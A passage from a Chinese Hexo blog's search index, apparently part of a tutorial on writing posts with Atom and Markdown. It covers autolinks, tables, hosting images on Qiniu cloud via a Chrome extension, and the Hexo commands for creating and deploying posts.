<h4 id="自动链接"><a href="#自动链接" class="headerlink" title="自动链接"></a><strong>自动链接</strong></h4><p>Markdown 支持以比较简短的自动链接形式来处理网址和电子邮件信箱，只要是用方括号包起来， Markdown 就会自动把它转成链接。例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;http://example.com/&gt;</div></pre></td></tr></table></figure></p>
<h4 id="表格"><a href="#表格" class="headerlink" title="表格"></a><strong>表格</strong></h4><p>在安装 markdown-table-editor 插件之后可以很方便的编辑表格，输入table,按 Tab 键就会出现表格样式。注意在表格之前要空一行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">| Header One | Header Two |</div><div class="line">|:---------- |:---------- |</div><div class="line">| Item One   | Item Two   |</div></pre></td></tr></table></figure></p>
<p>默认标题栏居中对齐，内容居左对齐。<br>-: 表示内容和标题栏靠右对齐，:- 表示内容和标题栏靠左对齐，:-: 表示内容和标题栏居中对齐。</p>
<h3 id="0x03-插入图片"><a href="#0x03-插入图片" class="headerlink" title="0x03 插入图片"></a><strong>0x03 插入图片</strong></h3><p>用 Markdown 写文章有个麻烦的地方就是不能直接插图片，通常需要将图片放在本地或者云上，然后在文章中通过图片链接（相对地址或网址）来插图片。为了节省 Blog 的空间，将图片上传到<a href="https://www.qiniu.com/" target="_blank" rel="external">七牛云</a>上。   </p>
<h4 id="1）注册账号并登录"><a href="#1）注册账号并登录" class="headerlink" title="1）注册账号并登录"></a><strong>1）注册账号并登录</strong></h4><h4 id="2）新建-buket"><a href="#2）新建-buket" class="headerlink" title="2）新建 buket"></a><strong>2）新建 buket</strong></h4><p>对象存储 &gt; 新建存储空间，输入相关信息。   </p>
<h4 id="3）极简图床-Chrome-插件"><a href="#3）极简图床-Chrome-插件" class="headerlink" title="3）极简图床 Chrome 插件"></a><strong>3）极简图床 Chrome 插件</strong></h4><p>使用极简图床可以绑定七牛云存储空间，然后可以通过拖拽的方式上传图片到云上。绑定七牛云需要空间名称、AK、SK 和域名。</p>
<div align="center"><br>  <img src="http://ooyovxue7.bkt.clouddn.com/17-4-26/26825806-file_1493208795361_1da.png?imageView/3/w/300/h/300/q/100"><br></div>

<h4 id="4）插入图片"><a href="#4）插入图片" class="headerlink" title="4）插入图片"></a><strong>4）插入图片</strong></h4><p>在文章中使用以下语法插入图片。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">![](image_link)</div><div class="line"></div><div class="line">&lt;div align=center&gt;  # 图片居中</div><div class="line">  &lt;img src= &quot;url&quot;/&gt;</div><div class="line">&lt;/div &gt;</div><div class="line"></div><div class="line">![](image_link?imageView/3/w/400/h/400/q/100)   # 七牛云图片缩放，w：刻度，h：高度，q：图片质量</div></pre></td></tr></table></figure></p>
<h3 id="0x04-文章发布"><a href="#0x04-文章发布" class="headerlink" title="0x04 文章发布"></a><strong>0x04 文章发布</strong></h3><p>在搭建好 Hexo Blog 之后，可以通过以下步骤新建并发布一篇新的文章。</p>
<h4 id="1）创建文章"><a href="#1）创建文章" class="headerlink" title="1）创建文章"></a><strong>1）创建文章</strong></h4><p>执行下列命令来创建一篇新文章。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hexo new post &lt;title&gt;</div></pre></td></tr></table></figure></p>
<h4 id="2）撰写文章"><a href="#2）撰写文章" class="headerlink" title="2）撰写文章"></a><strong>2）撰写文章</strong></h4><p>使用 Atom 和 Markdown 语法写文章内容。</p>
<h4 id="3）发布文章"><a href="#3）发布文章" class="headerlink" title="3）发布文章"></a><strong>3）发布文章</strong></h4><p>首先需要生成静态文件，然后部署到Hexo中。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">hexo clean  # 清除缓存文件 (db.json) 和已生成的静态文件 (public)</div><div class="line">hexo g      # 生成静态文件</div><div class="line">hexo d      # 部署网站</div></pre></td></tr></table></figure></p>
<hr>
<p>References:<br>[1] <a href="http://www.markdown.cn/" target="_blank" rel="external">Markdown 官网语法说明</a></p>
]]></content>
      
        <categories>
            
            <category> Others </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Atom </tag>
            
            <tag> Markdown </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
